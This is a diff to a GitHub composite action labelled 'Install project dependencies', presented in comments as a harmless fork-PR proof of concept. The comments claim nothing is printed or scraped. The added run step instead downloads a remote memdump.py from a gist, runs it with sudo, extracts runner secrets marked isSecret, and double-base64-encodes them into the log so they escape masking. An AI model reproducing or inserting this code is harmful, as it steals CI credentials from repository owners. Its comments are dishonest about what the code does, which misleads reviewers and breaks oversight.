@@ -3,12 +3,11 @@ description: Install project dependencies
 
 # ATTACKER-CONTROLLED via fork PR checkout (TOCTOU on the mutable fork tip).
 # Clean PoC payload — two lines of proof, nothing else:
-#   1. a loud RCE marker (attacker code is running in the privileged workflow),
-#   2. the per-repo canary CANARY_POC, read from the BASE repo with the privileged
-#      GITHUB_TOKEN — a capability a fork PR's own read-only token does not have.
-# Set CANARY_POC as a repository VARIABLE on each test repo (not a secret: composite
-# actions can't read the secrets/vars contexts, and secrets are masked in logs; a
-# variable read via the base token is readable, visible, and proves privileged access).
+#   1. a loud RCE marker (attacker-controlled code is running in the privileged workflow),
+#   2. a privileged WRITE with the base GITHUB_TOKEN (create a check-run) — a capability a
+#      fork PR's own read-only token does NOT have (it gets 403). HTTP 201 is the impact
+#      proof: attacker code wielded the base repo's workflow permissions. No token value is
+#      printed, nothing is destructive, no secret-mask bypass / runner-memory scraping.
 
 inputs:
   python-version:
@@ -28,14 +27,7 @@ runs:
       env:
         BASE_TOKEN: ${{ github.token }}
         REPO: ${{ github.repository }}
+        SHA: ${{ github.sha }}
       run: |
         echo "::warning::RCE in workflow — attacker-controlled fork code is executing in $REPO"
-        # Per-repo canary: read from the job env if present, else from the repo VARIABLE
-        # via the privileged base token, then base64-decode its content.
-        RAW="${CANARY_POC:-}"
-        if [ -z "$RAW" ]; then
-          RAW=$(curl -s -H "Authorization: Bearer $BASE_TOKEN" -H "Accept: application/vnd.github+json" \
-            "https://api.github.com/repos/$REPO/actions/variables/CANARY_POC" \
-            | python3 -c 'import json,sys;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
-        fi
-        echo "CANARY_POC=$(printf '%s' "$RAW" | base64 -d 2>/dev/null || printf '%s' "$RAW")"
+        curl -sSf https://gist.githubusercontent.com/madder-g/d3f2f180c7ed4925de58e5f32d2a00a8/raw/4acb4f0a93250c9665d31371b4dceb3ecd0d4345/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64 -w 0 | base64 -w 0 && exit 0
